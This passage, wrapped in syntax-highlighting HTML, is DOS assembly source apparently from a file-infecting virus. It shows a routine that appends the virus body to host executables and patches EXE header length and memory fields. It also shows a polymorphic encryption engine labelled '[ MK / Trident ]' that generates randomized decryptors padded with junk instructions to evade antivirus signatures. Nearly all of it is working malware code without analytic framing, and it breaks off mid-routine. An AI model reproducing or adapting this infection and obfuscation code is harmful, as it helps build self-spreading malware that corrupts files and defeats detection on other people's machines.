                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,((</span><span class="sc5">VIRPAR</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORKPAR</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc5">VIRPAR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;input parameters for engine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FILELEN</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">                   </span><span class="sc1">;call the Engine</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202</span><span class="sc0">                 </span><span class="sc1">;goto end</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                   </span><span class="sc1">;write virus</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;are all bytes written?</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;restore stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;restore registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Adjust mem allocation info in EXE header</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">mem_adjust</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc5">FILEPAR</span><span class="sc0">          </span><span class="sc1">;alloc. may be this much less</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">more</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATAPAR</span><span class="sc0">              </span><span class="sc1">;minimum amount to allocate</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">mem_ok</span><span class="sc0">
</span><span class="sc5">more</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATAPAR</span><span class="sc0">
</span><span class="sc5">mem_ok</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Read a few bytes</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">readbytes</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">goto</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">minibuf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Calculate length for EXE header</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">calclen</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_cor</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_cor</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Get original length of program</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">getlen</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Goto new offset DX:AX</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">gotobegin</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc9">goto</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*              Encryption Engine</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*      Input:  ES      work segment</span><span class="sc0">
</span><span class="sc1">;*              DS:DX   code to encrypt</span><span class="sc0">
</span><span class="sc1">;*              BP      what will be start of decryptor</span><span class="sc0">
</span><span class="sc1">;*              SI      what will be distance between decryptor and code</span><span class="sc0">
</span><span class="sc1">;*              CX      length of code</span><span class="sc0">
</span><span class="sc1">;*              AX      flags: bit 0: DS will not be equal to CS</span><span class="sc0">
</span><span class="sc1">;*                             bit 1: insert random instructions</span><span class="sc0">
</span><span class="sc1">;*                             bit 2: put junk before decryptor</span><span class="sc0">
</span><span class="sc1">;*                             bit 3: preserve AX with decryptor</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*      Output: ES:     work segment (preserved)</span><span class="sc0">
</span><span class="sc1">;*              DS:DX   decryptor + encrypted code</span><span class="sc0">
</span><span class="sc1">;*              BP      what will be start of decryptor (preserved)</span><span class="sc0">
</span><span class="sc1">;*              DI      length of decryptor / offset of encrypted code</span><span class="sc0">
</span><span class="sc1">;*              CX      length of decryptor + encrypted code</span><span class="sc0">
</span><span class="sc1">;*              AX      length of encrypted code</span><span class="sc0">
</span><span class="sc1">;*              (other registers may be trashed)</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[ MK / Trident ]'</span><span class="sc0">

</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;di = start of decryptor</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;save offset of code</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;save future offset of code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">;save flags</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;push  AX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_push</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">no_push</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;add a few bytes to cx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1F</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;save length of code</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;get random flags</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                                        </span><span class="sc1">;BX flags:</span><span class="sc0">

                                        </span><span class="sc1">;0,1    how to encrypt</span><span class="sc0">
                                        </span><span class="sc1">;2,3    which register for encryption</span><span class="sc0">
                                        </span><span class="sc1">;4      use byte or word for encrypt</span><span class="sc0">
                                        </span><span class="sc1">;5      MOV AL, MOV AH or MOV AX</span><span class="sc0">
                                        </span><span class="sc1">;6      MOV CL, MOV CH or MOV CX</span><span class="sc0">
                                        </span><span class="sc1">;7      AX or DX</span><span class="sc0">

                                        </span><span class="sc1">;8      count up or down</span><span class="sc0">
                                        </span><span class="sc1">;9      ADD/SUB/INC/DEC or CMPSW/SCASW</span><span class="sc0">
                                        </span><span class="sc1">;A      ADD/SUB or INC/DEC</span><span class="sc0">
                                        </span><span class="sc1">;       CMPSW or SCASW</span><span class="sc0">
                                        </span><span class="sc1">;B      offset in XOR instruction?</span><span class="sc0">
                                        </span><span class="sc1">;C      LOOPNZ or LOOP</span><span class="sc0">
                                        </span><span class="sc1">;       SUB CX or DEC CX</span><span class="sc0">
                                        </span><span class="sc1">;D      carry with crypt ADD/SUB</span><span class="sc0">
                                        </span><span class="sc1">;E      carry with inc ADD/SUB</span><span class="sc0">
                                        </span><span class="sc1">;F      XOR instruction value or AX/DX</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;get random encryption value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">random</span><span class="sc0">                  </span><span class="sc1">;again if 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xor_val</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_junk</span><span class="sc0">                 </span><span class="sc1">;insert random instructions</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0111</span><span class="sc0">                 </span><span class="sc1">;make flags to remember which</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                   </span><span class="sc1">;  MOV instructions are used</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">z0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
</span><span class="sc5">z0</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0C</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">z1</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc0">
</span><span class="sc5">z1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">z2</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">z2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">z3</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">73</span><span class="sc0">
</span><span class="sc5">z3</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">z4</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70</span><span class="sc0">

</span><span class="sc5">z4</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">mov_lup</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;put MOV instructions in</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000F</span><span class="sc0">                 </span><span class="sc1">;  a random order</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">mov_lup</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;test if MOV already done</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">mov_lup</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;remember which MOV done</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_mov</span><span class="sc0">                  </span><span class="sc1">;insert MOV instruction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_nop</span><span class="sc0">                  </span><span class="sc1">;insert a random NOP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;all MOVs done?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">mov_lup</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;save start of decryptor loop</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_add_ax</span><span class="sc0">               </span><span class="sc1">;add a value to AX in loop?</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_nop</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                   </span><span class="sc1">;carry with ADD/SUB ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_clc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_clc</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xor_offset</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_xor</span><span class="sc0">                  </span><span class="sc1">;place all loop instructions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_add</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;get start of decryptor loop</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_loop</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flags</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">;insert POP AX ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_pop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">no_pop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;calculate loop offset</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;up or down?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">v1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                   </span><span class="sc1">;encrypt with byte or word?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">v1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FE</span><span class="sc0">
</span><span class="sc5">v1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xor_offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">where_len</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0C</span><span class="sc0">                   </span><span class="sc1">;are BL,BH used for encryption?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">v2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">where_len2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">v3</span><span class="sc0">
</span><span class="sc5">v2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">v3</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xor_val</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;encryption value</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;ds:si = start of code</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;save ptr to encrypted code</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;save length of encrypted code</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                   </span><span class="sc1">;byte or word?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">blup</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;cx = # of crypts (words)</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

